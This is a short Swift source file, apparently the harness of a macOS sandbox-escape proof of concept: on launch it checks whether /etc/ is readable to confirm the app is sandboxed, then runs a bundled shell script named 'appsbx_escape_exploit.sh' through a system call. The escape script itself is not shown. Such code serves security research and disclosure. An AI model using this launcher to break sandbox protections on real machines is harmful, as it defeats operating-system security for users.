//
//  ContentView.swift
//  universal_sandbox_escape
//
//  Created by Gergely Kalman on 2022-12-05.
//

import SwiftUI

func check_sandbox()
{
    let fm = FileManager.default
    let list_url = URL(fileURLWithPath: "/etc/")
    var in_sandbox = false
    do {
        let files = try fm.contentsOfDirectory(at: list_url, includingPropertiesForKeys: nil)
        // process files
        for url in files
        {
            print("FOUND \(url)")
        }
    } catch {
        in_sandbox = true
    }
    if (in_sandbox != true)
    {
        print("[-] Not in sandbox! Dir \(list_url) is browseable!")
        exit(-1)
    }
    print("[+] We are properly sandboxed, dir \(list_url) is not browseable!")
}


struct ContentView: View {
    var body: some View {
        VStack {
            Image(systemName: "globe")
                .imageScale(.large)
                .foregroundColor(.accentColor)
            Text("Hello, world!")
        }
        .padding().onAppear(){
            check_sandbox()
            
            let path = NSString(string: "\"" + Bundle.main.resourcePath! + "/appsbx_escape_exploit.sh\"")
            print("Using script path: \(path)")
            let c_path = UnsafeMutablePointer<CChar>(mutating: path.utf8String)
            my_system(c_path)
            exit(0)
        }
    }
}

struct ContentView_Previews: PreviewProvider {
    static var previews: some View {
        ContentView()
    }
}
